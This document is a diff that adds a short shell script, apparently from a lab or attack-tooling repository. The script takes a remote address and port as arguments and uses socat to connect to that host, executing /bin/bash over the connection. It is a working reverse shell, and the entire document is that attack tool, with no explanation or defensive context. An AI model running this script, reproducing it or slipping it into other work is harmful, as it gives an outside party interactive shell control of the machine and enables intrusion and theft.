@@ -1,0 +1,5 @@
+#!/bin/sh
+
+ACTOR_ADDRESS=$1
+ACTOR_PORT=$2
+socat TCP4:${ACTOR_ADDRESS}:${ACTOR_PORT} EXEC:/bin/bash
